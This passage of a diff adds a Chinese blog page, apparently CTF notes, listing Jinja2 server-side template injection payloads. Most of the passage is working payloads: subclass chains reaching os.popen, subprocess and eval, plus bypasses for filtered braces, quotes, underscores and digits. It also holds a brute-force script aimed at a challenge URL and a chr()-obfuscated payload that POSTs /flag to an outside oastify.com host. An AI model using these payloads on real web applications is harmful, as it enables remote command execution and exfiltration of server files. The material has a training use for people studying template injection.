+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">built</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">ini</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">geti</span><span class="p">))(</span><span class="n">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">x</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">file</span><span class="o">=</span><span class="nb">chr</span><span class="p">((</span><span class="n">cccc</span><span class="o">~</span><span class="n">ccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">cc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">cccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">ccccccccc</span><span class="o">~</span><span class="n">ccccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">((</span><span class="n">cccccccccc</span><span class="o">~</span><span class="n">ccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">###全角数字代替半角数字</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">２４</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">a</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">１０３</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request 数字 {%print %}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">２４</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">so</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">e</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">q</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">f</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">so</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span> <span class="n">cmd</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">９９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">７９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">８４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">７０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">６１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">６４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">３２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１００</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１００</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０９</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span><span class="n">ldjwi</span><span class="p">{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>思路一：<code>object</code>的某个派生类中存在危险方法，直接调用
+思路二：<code>object</code>的某个派生类中导入了危险模块，可以链式调用危险方法
+思路三：<code>object</code>的某个派生类由于导入的某些标准库模块，从而简介导入了危险模块的危险方法，可以链式调用
+思路四：基本类型的某些方法属于特殊方法，可以链式调用</p>
+<h2 id="思路一">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af%e4%b8%80"></a>
+思路一
+</h2><p>1、<code>&lt;class 'os._warp_close'&gt;</code>派生类利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></div><p>2、<code>&lt;class 'subprocess.Popen'&gt;</code>派生类利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[408](&#39;ls&#39;,shell=True,stdout=-1).communicate()[0].strip()}}
+</span></span></code></pre></div><h2 id="思路二">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af%e4%ba%8c"></a>
+思路二
+</h2><p>自动检测脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://90160d3c-8821-47a1-8e0c-bb42011418bb.challenge.ctf.show/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">payload</span><span class="o">=</span><span class="s2">&#34;{{().__class__.__mro__[1].__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;].__init__.__globals__}}&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># print(r.request.url)</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># exit(0)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="s2">&#34;__builtins__&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></div><p>1、<code>__builtins__</code>
+<code>eval</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}}
+</span></span></code></pre></div><p><code>open</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__[&#39;__builtins__&#39;].open(&#34;/flag&#34;,&#34;r&#34;).read()}}
+</span></span></code></pre></div><p>2、<code>__import__</code></p>
+<p>3、<code>sys</code></p>
+<p>4、<code>os</code></p>
+<p>5、<code>linecache</code></p>
+<h2 id="框架tricks">
+<a class="header-anchor" href="#%e6%a1%86%e6%9e%b6tricks"></a>
+框架tricks
+</h2><h3 id="jinja2">
+<a class="header-anchor" href="#jinja2"></a>
+jinja2
+</h3><p>框架中的类和函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="bp">self</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">keys</span><span class="p">()}}</span>
+</span></span></code></pre></div><p>类：<code>config cycler joiner namespace config request session self appliaction</code>
+函数：<code>lipsum url_for get_flashed_messages</code></p>
+<h1 id="bypass">
+<a class="header-anchor" href="#bypass"></a>
+bypass
+</h1><h2 id="bypass-1">
+<a class="header-anchor" href="#bypass-1"></a>
+<code>{}</code>bypass
+</h2><p>方式唯一<code>{%%}</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%print (lipsum|attr(request.values.gl)).get(request.values.x).popen(request.values.f).read() %}&amp;gl=__globals__&amp;x=os&amp;f=cat /flagxxxxxxxxxx &amp;gl=__globals__&amp;x=os&amp;f=ls{%print (lipsum|attr(request.values.gl)).get(request.values.x).popen(request.values.f).read() %}&amp;gl=__globals__&amp;x=os&amp;f=cat /flag
+</span></span></code></pre></div><h3 id="姿势">
+<a class="header-anchor" href="#%e5%a7%bf%e5%8a%bf"></a>
+姿势
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% for i in &#39;&#39;.__class__.__mro__[1].__subclasses__() %}
+</span></span><span class="line"><span class="cl">	{% if i.__name__==&#39;_wrap_close&#39; %}
+</span></span><span class="line"><span class="cl">		{% print i.__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read() %}
+</span></span><span class="line"><span class="cl">	{% endif %}
+</span></span><span class="line"><span class="cl">{% endfor %}
+</span></span></code></pre></div><h2 id="bypass-2">
+<a class="header-anchor" href="#bypass-2"></a>
+<code>[]</code>bypass
+</h2><p>1、<code>__getitem__</code></p>
+<h2 id="数字bypass">
+<a class="header-anchor" href="#%e6%95%b0%e5%ad%97bypass"></a>
+数字bypass
+</h2><p>1、可在括号内做运算</p>
+<h2 id="bypass-3">
+<a class="header-anchor" href="#bypass-3"></a>
+<code>''&quot;&quot;</code>bypass
+</h2><p>1、<code>requests</code>
+函数<code>()</code>内可用
+<code>[]</code>内可用</p>
+<table>
+  <thead>
+      <tr>
+          <th>方法</th>
+          <th>paylaod</th>
+          <th>参数连接符</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>GET</td>
+          <td><code>request.args.x1</code></td>
+          <td><code>&amp;</code></td>
+      </tr>
+      <tr>
+          <td>POST</td>
+          <td><code>request.form.x1</code></td>
+          <td><code>&amp;</code></td>
+      </tr>
+      <tr>
+          <td>Cookie</td>
+          <td><code>request.cookies.k1</code></td>
+          <td><code>;</code></td>
+      </tr>
+      <tr>
+          <td>所有</td>
+          <td><code>request.values.k1</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>请求头参数</td>
+          <td><code>request.heads.x1</code></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.args.x1).read()}}&amp;x1=cat /flag
+</span></span></code></pre></div><p>2、<code>dict()+join()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set a=dict(l=1,s=2)|join%}{{().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(a).read()}}
+</span></span></code></pre></div><h2 id="_bypass">
+<a class="header-anchor" href="#_bypass"></a>
+<code>_</code>bypass
+</h2><p>1、<code>attr()</code>
+2、<code>[]</code></p>
+<h2 id="数字bypass-1">
+<a class="header-anchor" href="#%e6%95%b0%e5%ad%97bypass-1"></a>
+数字bypass
+</h2><p>1、使用count或者length获取数字</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set a=&#39;aaaa&#39;|length%}{{a}}
+</span></span><span class="line"><span class="cl">*
+</span></span><span class="line"><span class="cl">{%set a=&#39;aaaa&#39;|length*&#39;aaa&#39;|length%}{{a}}
+</span></span><span class="line"><span class="cl">-
+</span></span><span class="line"><span class="cl">{%set a=&#39;aaaa&#39;|length*&#39;aaa&#39;|length-&#39;aa&#39;|length%}{{a}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% set one=(dict(a=a)|join|length)%}
+</span></span><span class="line"><span class="cl">{% set two=(dict(aa=a))|join|length)%}
+</span></span></code></pre></div><p>2、使用全角数字代替半角数字</p>
+<p>替换脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">half2full</span><span class="p">(</span><span class="n">half</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">full</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">half</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ch</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xfee0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ch</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="n">full</span> <span class="o">+=</span> <span class="n">ch</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">full</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;输入想要转换的数字字符串：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">+=</span> <span class="n">half2full</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+</span></span></code></pre></div><p><code>chr</code>字符脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">half2full</span><span class="p">(</span><span class="n">half</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">full</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">half</span><span class="p">:</span>
